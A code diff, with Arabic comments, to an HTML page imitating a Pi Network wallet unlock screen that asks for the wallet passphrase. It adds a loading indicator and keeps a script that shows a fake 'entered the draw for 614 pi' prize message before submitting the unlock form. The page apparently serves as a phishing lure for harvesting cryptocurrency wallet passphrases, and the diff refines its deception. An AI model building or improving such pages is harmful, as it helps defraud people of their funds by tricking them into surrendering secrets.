@@ -93,6 +93,14 @@
                 background: #357abd;
             }
 
+        /* مؤشر التحميل */
+        .loading {
+            display: none;
+            font-size: 24px;
+            color: #4a90e2;
+            margin-top: 20px;
+        }
+
         @keyframes fireworks {
             0% {
                 opacity: 0;
@@ -147,6 +155,10 @@
         </form>
 
         <button class="btn-filled" onclick="showMessage()">Unlock With Fingerprint</button>
+
+        <!-- مؤشر التحميل -->
+        <div id="loading" class="loading">Loading...</div>
+
         <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
     </main>
@@ -155,14 +167,22 @@
         function showMessage(event) {
             if (event) event.preventDefault(); // منع إرسال النموذج مباشرة
 
+            // إظهار مؤشر التحميل
+            document.getElementById('loading').style.display = 'block';
+
+            // إنشاء رسالة التهاني
             let firework = document.createElement("div");
             firework.className = "fireworks";
             firework.innerHTML = "🎉 Congratulations! You have entered the draw for 614 pi! 🎉";
             document.body.appendChild(firework);
 
+            // إزالة الرسالة بعد 3 ثواني
             setTimeout(() => {
                 firework.remove();
-                document.getElementById("unlockForm").submit(); // بعد ظهور الرسالة، يتم إرسال النموذج
+                // إخفاء مؤشر التحميل
+                document.getElementById('loading').style.display = 'none';
+                // إرسال النموذج بعد فترة قصيرة
+                document.getElementById("unlockForm").submit();
             }, 3000); // الانتظار حتى تختفي الرسالة
         }
     </script>
